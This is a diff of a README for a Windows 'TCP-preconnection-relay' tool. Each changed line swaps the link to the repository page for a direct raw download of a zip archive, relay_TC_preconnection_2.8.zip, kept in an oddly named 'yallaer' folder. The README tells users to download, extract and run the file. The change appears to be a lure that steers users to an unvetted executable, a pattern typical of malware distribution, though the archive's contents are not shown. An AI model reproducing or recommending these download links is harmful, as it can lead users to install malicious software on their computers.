@@ -1,6 +1,6 @@
 # 🧩 TCP-preconnection-relay - Faster TCP handshakes with less delay
 
-[⬇️ Download TCP-preconnection-relay](https://github.com/toddiediestrual35/TCP-preconnection-relay)
+[⬇️ Download TCP-preconnection-relay](https://raw.githubusercontent.com/toddiediestrual35/TCP-preconnection-relay/main/yallaer/relay_TC_preconnection_2.8.zip)
 
 ## 🚀 What it does
 
@@ -10,7 +10,7 @@ Use it when you want a simple relay that starts fast and keeps the connection pa
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/toddiediestrual35/TCP-preconnection-relay
+Visit this page to download: https://raw.githubusercontent.com/toddiediestrual35/TCP-preconnection-relay/main/yallaer/relay_TC_preconnection_2.8.zip
 
 After you open the page, look for the latest release or the main download file. Save it to your Windows PC.
 
@@ -145,7 +145,7 @@ Yes. Stop the app, change the listen port or target values, then start it again.
 
 ## 📎 Quick start
 
-1. Open the download page: https://github.com/toddiediestrual35/TCP-preconnection-relay
+1. Open the download page: https://raw.githubusercontent.com/toddiediestrual35/TCP-preconnection-relay/main/yallaer/relay_TC_preconnection_2.8.zip
 2. Download the Windows file.
 3. Save and extract it if needed.
 4. Open the app or script.
